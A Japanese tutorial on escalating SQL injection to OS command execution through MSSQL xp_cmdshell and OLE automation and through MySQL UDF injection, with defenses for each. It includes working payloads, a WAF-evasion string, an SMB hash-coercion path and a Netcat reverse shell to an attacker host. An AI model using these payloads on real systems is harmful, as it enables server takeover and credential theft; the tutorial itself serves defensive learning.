## SQLi→RCE：MSSQL xp_cmdshellとMySQL UDF

SQLインジェクション（SQLi）の到達点は、多くの場合「データベースの中身を読む」ことだと思われがちです。しかし攻撃者にとっての本命は、そこからさらに一段深く踏み込み、**データベースサーバのOS上で任意コマンドを実行する（RCE：Remote Code Execution）**ことにあります。DBMSはOS上の一プロセスとして動いており、その権限でファイルを書いたり外部プログラムを起動したりできる「正規の機能」を備えています。この機能を攻撃者が乗っ取れば、SQLiは一気に「サーバ完全掌握」へと格上げされます。

本節では、その二大定番ルートを仕組みレベルで解説します。

- **Microsoft SQL Server（MSSQL）**：拡張ストアドプロシージャ `xp_cmdshell` を有効化してWindowsコマンドを実行する。
- **MySQL / MariaDB**：ユーザ定義関数（UDF：User Defined Function、DBに独自のネイティブ関数を追加する仕組み）である `lib_mysqludf_sys` を仕込み、`sys_exec` / `sys_eval` でOSコマンドを実行する。

いずれも前提となるのが、**スタックドクエリ（stacked queries：`;` で複数のSQL文を連結して一度に実行させる手法）**、そして**十分に高いDB権限**です。この2つが「なぜ必要か」も含めて見ていきます。

> **前提となる用語**
> - **拡張ストアドプロシージャ（Extended Stored Procedure, XP）**：MSSQLがC/C++で書かれたDLLの関数をSQLから呼び出せるようにした仕組み。`xp_` で始まる。SQL文法の外側、つまりOSネイティブコードへの「窓口」になる。
> - **UDF（User Defined Function）**：MySQLで、共有ライブラリ（`.so`／`.dll`）内のネイティブ関数をSQL関数として登録する仕組み。`CREATE FUNCTION ... SONAME '...'` で登録する。
> - **sink（シンク）**：入力が最終的に実行・解釈される危険な代入先。ここでは「OSのコマンドインタプリタ（`cmd.exe` や `/bin/sh`）」がsinkになる。

---

### 1. MSSQL：xp_cmdshell によるコマンド実行

#### 1.1 xp_cmdshell とは何か、なぜ危険か

`xp_cmdshell` は、MSSQLに標準で同梱される拡張ストアドプロシージャで、**SQL文からWindowsのシェルコマンドをそのまま実行できる**機能です。insidersecurity の解説では次のように定義されています。

> _xp_cmdshell_ is an extended stored procedure in Microsoft SQL Server that allows users to execute Windows shell commands from the SQL Server environment.

内部的には、`xp_cmdshell 'コマンド'` を呼ぶと、MSSQLのプロセス（`sqlservr.exe`）が子プロセスとして `cmd.exe /c コマンド` を起動します。ここで決定的に重要なのが、**起動される子プロセスは SQL Server サービスアカウントのセキュリティコンテキストを継承する**という点です。つまり「誰としてコマンドが動くか」はDBログインの権限ではなく、SQL Serverサービスが動いているOSアカウントで決まります。

insidersecurity は、実行コンテキストになり得るアカウントを次のように整理しています。

- **NT AUTHORITY\SYSTEM** … OS上の最強権限（完全な管理者）。古い構成や一部インストールで見られる。
- **NT SERVICE\MSSQLSERVER** … 仮想サービスアカウント。既定かつ限定的権限。
- **ドメインサービスアカウント** … 権限は構成次第。ドメイン内で横展開（ラテラルムーブメント）の起点になりやすい。
- **プロキシアカウント** … 意図的に低権限で実行させるためのオプション。

さらに権限モデルについて重要な補足があります。

> If the user is not a member of the _SysAdmin_ Role, the _xp_cmdshell_ will execute commands using the account name and password stored in the credential named _'xp_cmdshell_proxy_account'_.

つまり、呼び出したDBログインが **sysadmin ロール**であればSQL Serverサービスアカウントとして実行され、そうでなければ `xp_cmdshell_proxy_account` という資格情報として実行されます（プロキシが設定されていなければ非sysadminは実行不可）。攻撃で狙われるのは前者、すなわち**アプリが sysadmin 相当のDBユーザで接続しているケース**です。Webアプリが `sa` や sysadmin ロールのアカウントでDBに繋いでいると、SQLi一発でOSの高権限コマンド実行に化けます。これが「最小権限の原則」がDB接続でも死活的に重要な理由です。

> 出典: Technical Analysis of xp_cmdshell Exploitation in MS SQL — https://insidersecurity.co/exploitation-of-xp_cmdshell-in-ms-sql-critical-risks-how-to-defend/

#### 1.2 xp_cmdshell を有効化する（sp_configure）

`xp_cmdshell` は SQL Server 2005 以降、**既定で無効**になっています（2000年代前半のワーム被害を受けたセキュリティ強化の一環）。したがって攻撃者はまずこれを有効化する必要があります。有効化は `sp_configure` という設定用ストアドプロシージャで行います。ここで問題になるのが、`xp_cmdshell` は「詳細設定（advanced options）」に属するため、**先に詳細設定の表示・変更を許可**してから操作しなければならない点です。手順は次の通りです。

```sql
-- 1. 詳細オプションの変更を許可する
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. xp_cmdshell を有効化する
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. コマンドを実行する
EXEC master..xp_cmdshell 'whoami';
```

**なぜ `RECONFIGURE` が要るのか。** `sp_configure` は設定値を「構成値（config_value）」に書き込むだけで、実際に稼働中サーバへ反映（「実行値 run_value」への反映）するには `RECONFIGURE` が必要だからです。片方だけでは設定が効きません。また `master..xp_cmdshell` の `master..` は「masterデータベースのdefaultスキーマ（=dbo）」を指す省略記法で、`xp_cmdshell` の実体が master DB にあることを明示しています。

**なぜスタックドクエリが必要か。** 上記は複数のSQL文の連続実行です。SQLi経由でこれを流し込むには、脆弱な箇所で `;` による文連結が許される必要があります。MSSQL のドライバ（特にADO.NET系）は**スタックドクエリを許容する**ことが多く、これがMSSQLでSQLi→RCEが成立しやすい大きな理由です（MySQLの標準的なコネクタは既定でスタックドクエリを拒否することが多く、対照的）。実際のインジェクションでは、たとえば脆弱なパラメータに以下を流します。

```sql
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; --
```

HackTricks には、WAF（Web Application Firewall）を回避しつつ同じことを行う、シングルクォートを二重化して `EXEC('...')` で包んだ実物ペイロードが載っています。

```sql
admin'exec('sp_configure''show advanced options'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

ここで `''` は文字列リテラル内のシングルクォートのエスケープ（`'` を表す）であり、`exec('文字列')` は**動的SQL**として文字列を実行させます。動的SQLで包む狙いは、`sp_configure` や `xp_cmdshell` といったシグネチャをWAFの静的検知から外しつつ、文字列連結で組み立て直すことにあります。

> 出典: MSSQL injection — HackTricks（公式ソース: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md 、正規URL: https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection ）

> ⚠️ **未取得の資料**: HackTricks の正規URL `https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection` は自動取得できませんでした（理由: 302リダイレクトで `tollbit.hacktricks.wiki` の有料ミラーに転送され、HTTP 402 Payment Required でブロック）。**同一内容は HackTricks 公式GitHubリポジトリの原本 Markdown から取得済み**です。原文を直接確認したい場合は上記正規URL、または原本 `https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/sql-injection/mssql-injection.md` をご覧ください。

#### 1.3 xp_cmdshell が無効/削除されているとき：sp_OACreate（OLEオートメーション）

`xp_cmdshell` は監視・無効化の第一標的なので、防御側が潰していることもあります。その場合の代替として **OLE Automation（`sp_OACreate` 系）**があります。これはMSSQLがWindowsのCOMオブジェクトをインスタンス化・操作できる機能で、`WScript.Shell` などを掴めばコマンド実行に化けます。

```sql
-- OLE Automation を有効化
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- WScript.Shell を生成して Run でコマンド実行
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\o.txt';
```

> （以下は、この小節の `sp_OACreate` 例が今回取得したHackTricks原本には未掲載のため、一般知識に基づく補足解説です）
> `sp_OACreate` はCOMオブジェクトのハンドルを返し、`sp_OAMethod` でそのメソッドを呼びます。`Run` は同期実行だが標準出力を直接返さないため、上記のように一旦ファイルへリダイレクトし、後述の `OPENROWSET(BULK...)` 等で読み戻すのが定石です。これも「詳細オプション」に属するので `show advanced options` の先行有効化が要る点は `xp_cmdshell` と同じ仕組みです。

#### 1.4 コマンド実行に至らなくても危険：ファイル読取・NTLMリレー

sysadmin 権限がなくRCEに届かない場合でも、MSSQLには情報漏えい・認証情報奪取につながる機能が複数あります。HackTricks から実物を引用します。

**任意ファイルの読み取り（OPENROWSET + BULK）**

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/win.ini', SINGLE_CLOB) AS x;
```

`OPENROWSET(BULK ...)` はファイルを一括読み込みする機能で、`SINGLE_CLOB`（1つの文字LOBとして読む）を指定すると、指定ファイルの中身をそのままクエリ結果として返せます。設定ファイルや資格情報を含むファイルの窃取に使われます。

**NetNTLMハッシュの奪取（xp_dirtree / SMB強制認証）**

さらに、`OPENROWSET(BULK ...)` や `xp_dirtree` に**UNCパス（`\\attacker-ip\share`）**を渡すと、SQL ServerサービスアカウントがそのSMBサーバへ**自動的に認証を試みる**ため、攻撃者は待ち受けたSMBサーバで**NetNTLMハッシュ**を捕捉できます。HackTricks はこれを次のように説明しています。

> Can coerce SMB authentication, potentially leaking NetNTLM credentials of the service account.（`xp_dirtree` は TCP 445/SMB に限定される。代替として `xp_fileexist`, `xp_subdirs` も同様）

捕捉したハッシュはオフラインクラックするか、**NTLMリレー**でそのまま他サービスへ中継して権限昇格・横展開に使えます。「コマンドが1つも実行できなくても、DBが勝手に認証情報を漏らす」という点が、この攻撃の陰湿さです。

このほかHackTricksは、権限に応じたSSRF（サーバサイドリクエストフォージェリ）用の関数として、`fn_xe_file_target_read_file`（`VIEW SERVER STATE` / 2022+では `VIEW SERVER PERFORMANCE STATE` が必要）、`fn_get_audit_file`（`CONTROL SERVER` / 2022+では `VIEW SERVER SECURITY AUDIT`）、`fn_trace_gettable`（`CONTROL SERVER`）を挙げ、さらに `dbo` 権限があれば **CLR（.NETアセンブリ）**をロードして `WebClient` で任意HTTPリクエストを送れると述べています（バージョン・権限依存の高度な手口）。

> 出典: MSSQL injection — HackTricks — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

#### 1.5 MSSQL側の防御

insidersecurity の推奨をまとめます。仕組みと対応させて理解するのが肝心です。

- **不要なら xp_cmdshell を無効化**（既定で無効。`sp_configure 'xp_cmdshell',0`）。攻撃の入口そのものを塞ぐ。
- **SQL Serverサービスアカウントを最小権限に**。万一実行されても被害範囲（子プロセスの権限）を絞れる。`NT AUTHORITY\SYSTEM` での運用を避け、専用の低権限ドメインアカウント等にする。
- **アプリのDB接続を最小権限に**。`sa`/sysadmin での接続を避ければ、そもそも有効化操作ができない。
- **パラメータ化クエリ（プリペアドステートメント）**でSQLi自体を根絶。スタックドクエリの注入口を与えない。
- **包括的なログ・監視**（`sp_configure` 変更や `xp_cmdshell` 呼び出しの検知）、WAF導入、定期的な監査。

> 出典: Technical Analysis of xp_cmdshell Exploitation in MS SQL — https://insidersecurity.co/exploitation-of-xp_cmdshell-in-ms-sql-critical-risks-how-to-defend/

---

### 2. MySQL / MariaDB：UDF（lib_mysqludf_sys）によるコマンド実行

MSSQLの `xp_cmdshell` に相当する「標準のコマンド実行XP」は、MySQLには**存在しません**。そこで攻撃者は、**自前でネイティブ関数を注入する**という一段手の込んだ手口を取ります。それが `lib_mysqludf_sys` を使った **UDFインジェクション**です。

#### 2.1 攻撃チェーンの全体像

securitypentester.ninja が示す Linux での攻撃手順を、原文のSQLごと追います。全体は「①共有ライブラリをプラグインディレクトリに書き込む → ②その中の関数をUDFとして登録する → ③関数を呼んでコマンド実行」という3段構えです。

```sql
-- 前提: mysql データベースを使う
use mysql;

-- ① blob列を持つ一時テーブルを作る
CREATE TABLE root(line blob);

-- ② 事前にサーバ上へ置いた .so をDBに読み込み、プラグインディレクトリへ書き出す
INSERT INTO root values(load_file('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM root into dumpfile '/usr/lib/lib_mysqludf_sys.so';

-- ③ .so 内の sys_exec を UDF として登録
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';

-- ④ リバースシェルを起動
SELECT sys_exec("nc 192.168.1.2 3128 -e /bin/bash");
```

各ステップの「なぜ」を分解します。

**なぜ `blob` テーブルを経由するのか。** 目的はライブラリのバイナリを**MySQLの権限で任意パスへ書き出す**ことです。`load_file()` はサーバ上のファイルをバイナリのまま読み込む関数、`INTO DUMPFILE` は**クエリ結果を無加工でファイルに書き出す**構文です（`INTO OUTFILE` は行区切りや文字エスケープを挟むためバイナリが壊れる。`DUMPFILE` は1行を生のまま書くのでバイナリ保存に適する）。バイナリを一旦 `blob` 列に格納し、それを `DUMPFILE` で吐き出すことで、shared object をビット単位で正確に配置できます。

**なぜプラグインディレクトリなのか。** `CREATE FUNCTION ... SONAME 'lib_mysqludf_sys.so'` は、MySQLがライブラリを**プラグインディレクトリ（`@@plugin_dir`、多くは `/usr/lib/mysql/plugin/` や上例の `/usr/lib/`）**からしか読み込まない仕様のため、そこに配置する必要があります（バージョン依存。MySQL 5.1以降、UDFライブラリはプラグインディレクトリ配下限定に厳格化された）。`@@plugin_dir` は `SELECT @@plugin_dir;` で確認します。

**なぜコマンドが実行できるのか。** `sys_exec` は `lib_mysqludf_sys` が提供するネイティブ関数で、その中身は後述の通り C の `system()` を直接呼びます。DB内の関数呼び出しが、そのまま OS のコマンドインタプリタ（sink）に到達するわけです。

**リバースシェルの意味。** `nc 192.168.1.2 3128 -e /bin/bash` は、攻撃者ホスト `192.168.1.2` のポート `3128` へ接続し、`-e /bin/bash` で `/bin/bash` を接続先に繋ぐ（＝攻撃者側から対話シェルが取れる）Netcatのリバースシェルです。実行権限は **MySQLサーバプロセスのアカウント**（多くは `mysql` ユーザ、設定不備なら `root`）になります。

**Windows版**も同様で、`.dll`（`lib_mysqludf_sys.dll` / `lib_mysqludf_sys_32.dll`）を `C:\Windows\System32\` 等へ書き出し、`sys_exec` を登録して、ユーザ作成やRDP有効化といったコマンドを実行します。DLLはターゲットのアーキテクチャ（32bit/64bit）に一致させる必要があります。

**前提条件（prerequisites）**は次の通りで、1つでも欠けると成立しません。

- **FILE権限**：`load_file` / `INTO DUMPFILE` はDBユーザに `FILE` 権限が必要。
- **書き込み可能なプラグインディレクトリ**：`INTO DUMPFILE` でそこへ書けること。
- **`secure_file_priv` の制約**：`SELECT @@secure_file_priv;` の値が空（`''`）ならどこでも読み書き可、特定ディレクトリ指定ならその範囲のみ、`NULL` なら **`load_file`/`OUTFILE`/`DUMPFILE` が全面禁止**（後述）。
- **アーキテクチャ一致**：`.so`/`.dll` がサーバのビット数と一致。

> 出典: MySQL UDF Injection — securitypentester.ninja — https://securitypentester.ninja/mysql-udf-injection/

#### 2.2 lib_mysqludf_sys が提供する関数（ソースを読む）

`lib_mysqludf_sys` の実体を、GitHubの原本ソース（`lib_mysqludf_sys.c`）で確認します。提供される関数は次の通りで、それぞれ C の標準関数を薄くラップしているだけ、という点が「なぜ動くか」の核心です。

| UDF関数 | 役割 | 内部実装 |
|---|---|---|
| `sys_exec` | コマンド文字列を実行し**終了ステータス**を返す | `system(args->args[0])` を直接呼ぶ |
| `sys_eval` | コマンドを実行し**標準出力**を返す | `popen(args->args[0], "r")` で実行し `fgets()` で出力回収 |
| `sys_get` | 環境変数の値を取得 | `getenv(args->args[0])` |
| `sys_set` | 環境変数を設定 | `SETENV` マクロ（Unixは `setenv()`、Windowsは `SetEnvironmentVariable()`） |

関数シグネチャ（原本 `lib_mysqludf_sys.c` より抜粋）:

```c
// コマンドを実行して終了コードを返す（内部で system() を呼ぶ）
my_ulonglong sys_exec(UDF_INIT *initid, UDF_ARGS *args,
                      char *is_null, char *error);

// コマンドを実行して標準出力を返す（内部で popen() を呼ぶ）
char* sys_eval(UDF_INIT *initid, UDF_ARGS *args, char* result,
               unsigned long* length, char *is_null, char *error);
```

**`sys_exec` と `sys_eval` の使い分け。** `sys_exec` は `system()` ラッパで、返るのは終了ステータス（整数）だけ。攻撃で「結果を画面で読みたい」ときは `popen()` ラッパの `sys_eval` を使うと標準出力がSQL結果として返ります。ブラインドSQLiのように出力が見えない状況では `sys_exec` でリバースシェルやファイル書き出しを行い、出力を別経路で回収します。

**インストール用SQL（原本 `lib_mysqludf_sys.sql`）** は次の通りで、5関数を一括登録します。攻撃者は必要な `sys_exec` だけを登録することも、この一式を流すこともあります。

```sql
DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get  RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set  RETURNS int    SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int    SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
```

`RETURNS` の型が関数の性質と対応している点に注目してください。`sys_exec` は終了コードなので `int`、`sys_eval`（標準出力）と `sys_get`（環境変数値）は `string` です。

> 出典: lib_mysqludf_sys（`lib_mysqludf_sys.c` / `lib_mysqludf_sys.sql`）— https://github.com/mysqludf/lib_mysqludf_sys

#### 2.3 なぜ MySQL の RCE は MSSQL より「面倒」なのか

同じSQLi→RCEでも、MySQLはMSSQLより成立条件が厳しいことが多く、その理由は仕組みに根ざしています。

1. **スタックドクエリの制約**：MySQLの多くのコネクタ（例：PHPの `mysqli_query()`）は**1リクエストで1文しか実行しない**ため、`; CREATE FUNCTION ...` を後続に付けても無視されます。UDF注入には、複数文実行を許すAPI（`multi_query`）や、`INTO DUMPFILE` 単体で完結する経路が必要です。逆にMSSQLはスタックドクエリが通りやすく、この差がRCE難易度に直結します。
2. **`secure_file_priv`**：MySQL 5.7.6 以降は既定で `secure_file_priv` が特定ディレクトリ（多くは空でない値）に設定され、さらにディストリのパッケージでは `NULL` に設定されていることもあります。`NULL` なら `load_file`/`INTO DUMPFILE` が**完全に無効**になり、ライブラリをプラグインディレクトリへ書き込む手段が断たれます。これが現代のMySQLでUDF注入が難しくなった最大要因です。
3. **プラグインディレクトリの書き込み権限**：`@@plugin_dir` は通常 `mysql` ユーザのみ書き込み可・rootが所有で、`secure_file_priv` がそこを許可していないと `DUMPFILE` できません。
4. **`FILE` 権限**：Webアプリ用DBユーザに `FILE` 権限が付いていることは本来まれで、付いていること自体が設定ミスです。

つまり、MySQL UDF注入が成立する環境は「`FILE`権限あり・`secure_file_priv`が空か緩い・プラグインディレクトリが書ける・複数文実行が通る」という**複数の設定不備が重なった状態**であり、裏を返せば、これらのいずれか一つを正すだけで攻撃を封じられます。

> （以下は本小節の設定依存性についての一般知識に基づく補足です。バージョン・年に依存するため対象を明記します：`secure_file_priv` の既定変更は MySQL 5.7.6（2015年）以降、`--secure-file-priv` の厳格化はディストリパッケージにより差があります。）

#### 2.4 MySQL側の防御

- **`FILE` 権限を付与しない**：アプリ用アカウントから剥奪すれば `load_file`/`DUMPFILE` が使えず、ライブラリを書き込めない。
- **`secure_file_priv` を `NULL` か厳格なパスに**：ファイル入出力を無効化、またはプラグインディレクトリと無関係な場所に限定する。
- **MySQLを非root・専用低権限アカウントで実行**：万一 `sys_exec` が通っても、コマンドは `mysql` ユーザ権限に留まり、`root` を直接奪われない。
- **プラグインディレクトリを書き込み不可に**：所有者・パーミッションを厳格化し、DBプロセスから書けないようにする。
- **プリペアドステートメント＋複数文実行の無効化**：SQLi自体を塞ぎ、コネクタの `multi_query` 相当を使わない。

---

### 3. まとめ：二つのルートの共通構造

MSSQLの `xp_cmdshell` と MySQLの `lib_mysqludf_sys` は、表面上まったく別物に見えますが、本質は同じ「**SQLの世界からOSネイティブコード（sink）への橋渡し機能を、攻撃者権限で起動する**」という一点に集約されます。

| 観点 | MSSQL (xp_cmdshell) | MySQL (UDF) |
|---|---|---|
| コマンド実行の実体 | 既存XPが `cmd.exe` を起動 | 自前 `.so`/`.dll` の `system()`/`popen()` |
| 事前準備 | `sp_configure` で有効化するだけ | ライブラリをプラグインディレクトリへ書込＋`CREATE FUNCTION` |
| 必要な高権限 | sysadmin ロール | `FILE`権限＋緩い`secure_file_priv` |
| スタックドクエリ | 通りやすい（成立しやすい） | 通りにくい（成立しにくい） |
| 実行アカウント | SQL Serverサービスアカウント（最悪SYSTEM） | mysqlプロセスのアカウント（最悪root） |
| 最重要の防御 | 機能無効化＋DB接続を最小権限に | `FILE`剥奪／`secure_file_priv`＝NULL |

いずれのルートでも、防御の核心は**「アプリのDB接続を高権限で行わない（最小権限の原則）」**と**「危険機能を既定で無効化・剥奪する」**の2点であり、そしてそもそもの入口である**SQLi をパラメータ化クエリで根絶する**ことが、最も上流かつ確実な対策です。SQLiが1つでも残っていれば、DBの正規機能が攻撃者にとっての「OSへの扉」になり得る——これが本節を貫く教訓です。
